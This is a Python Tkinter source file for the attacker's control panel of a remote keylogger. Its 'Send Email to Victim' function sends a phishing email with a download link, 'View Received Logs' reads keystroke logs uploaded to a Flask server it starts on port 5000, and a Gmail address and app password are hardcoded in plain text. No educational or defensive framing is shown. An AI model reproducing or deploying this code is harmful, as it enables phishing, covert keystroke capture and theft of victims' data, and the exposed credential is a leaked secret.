import os
import json
import tkinter as tk
from tkinter import messagebox, scrolledtext
from threading import Thread
from keylogger_cli import run_flask_server, send_email, compose_email, UPLOAD_FOLDER

root = tk.Tk()

# ========== GUI UTILS ==========
def log(message):
    output_box.insert(tk.END, message + '\n')
    output_box.see(tk.END)

def view_logs():
    files = os.listdir(UPLOAD_FOLDER)
    if not files:
        messagebox.showinfo("Logs", "No logs found.")
        return
    latest = sorted(files)[-1]
    with open(os.path.join(UPLOAD_FOLDER, latest), 'r') as f:
        data = json.load(f)
    viewer = tk.Toplevel(root)
    viewer.title(f"Logs - {latest}")
    text = scrolledtext.ScrolledText(viewer, wrap=tk.WORD)
    text.pack(expand=True, fill='both')
    for entry in data:
        text.insert(tk.END, f"{entry}\n")

def real_email():
    email_win = tk.Toplevel(root)
    email_win.title("Send Email to Victim")

    tk.Label(email_win, text="Victim Email:").pack()
    victim_entry = tk.Entry(email_win, width=40)
    victim_entry.pack()

    tk.Label(email_win, text="Download Link:").pack()
    link_entry = tk.Entry(email_win, width=40)
    link_entry.pack()

    def send():
        try:
            sender_email = "thapapratima240@gmail.com"
            app_password = "fvovtsdsijgemwan"
            victim_email = victim_entry.get()
            github_link = link_entry.get()

            subject, body = compose_email(github_link)
            send_email(sender_email, app_password, victim_email, subject, body)
            log(f"[+] Email sent to {victim_email}")
            messagebox.showinfo("Success", f"Email sent to {victim_email}")
        except Exception as e:
            log(f"[!] Email failed: {e}")
            messagebox.showerror("Error", str(e))

    tk.Button(email_win, text="Send", command=send).pack(pady=10)

# ========== GUI SETUP ==========
root.title("Attacker GUI - Remote Keylogger")
root.geometry("450x350")

tk.Label(root, text="😈 Keylogger", font=("Arial", 14)).pack(pady=10)
tk.Button(root, text="📨 Send Email to Victim", width=35, command=real_email).pack(pady=5)
tk.Button(root, text="📂 View Received Logs", width=35, command=view_logs).pack(pady=5)

output_box = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=10)
output_box.pack(fill='both', expand=True, padx=10, pady=10)

log("[*] Starting server on http://0.0.0.0:5000")

# ========== START FLASK SERVER ==========
Thread(target=run_flask_server, daemon=True).start()

root.mainloop()